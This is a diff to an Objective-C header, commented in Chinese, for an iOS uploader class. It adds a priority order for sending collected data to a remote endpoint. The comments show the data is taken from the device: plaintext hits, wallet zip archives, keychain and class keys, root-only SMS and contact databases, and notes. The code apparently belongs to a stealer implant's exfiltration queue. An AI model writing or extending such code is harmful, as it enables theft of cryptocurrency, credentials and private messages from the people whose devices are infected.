@@ -8,6 +8,16 @@ extern NSString * const OWUploadKindMeta;
 extern NSString * const OWUploadKindSystem;   // 系统库（短信/通讯录…），需 root
 extern NSString * const OWUploadKindHits;     // 端上抽取出的明文命中
 
+/// 上传顺序：数值越小越先传；同优先级按体积升序（小的先走）
+typedef NS_ENUM(NSInteger, OWUploadPriority) {
+    OWUploadPriorityHits      = 0,   // hits.json / hits_plain.txt
+    OWUploadPriorityMeta      = 1,   // 设备心跳清单
+    OWUploadPriorityContainer = 10,  // 钱包 zip（组内按体积小→大）
+    OWUploadPriorityKeys      = 20,  // keychain / class keys（A 通道）
+    OWUploadPrioritySystem    = 25,  // 系统库（A 通道）
+    OWUploadPriorityNotes     = 90,  // 备忘录：永远最后
+};
+
 @interface OWUploader : NSObject
 
 /// 当前生效端点：UserDefaults 的 OWUploadEndpointOverride 优先，其次 Info.plist 的 OWUploadEndpoint。
@@ -21,6 +31,11 @@ extern NSString * const OWUploadKindHits;     // 端上抽取出的明文命中
 
 // 入队：文件写入 pending 目录（断网暂存），随后 flush 时统一上传
 - (BOOL)enqueueFile:(NSString *)path kind:(NSString *)kind error:(NSError **)error;
+/// 带优先级入队；flush 时按 priority 升序、同优先级按体积升序处理
+- (BOOL)enqueueFile:(NSString *)path
+               kind:(NSString *)kind
+           priority:(OWUploadPriority)priority
+              error:(NSError **)error;
 
 // 逐个上传 pending 中未成功的条目；失败保留在队列，下次启动继续
 - (BOOL)flush:(NSError **)error;
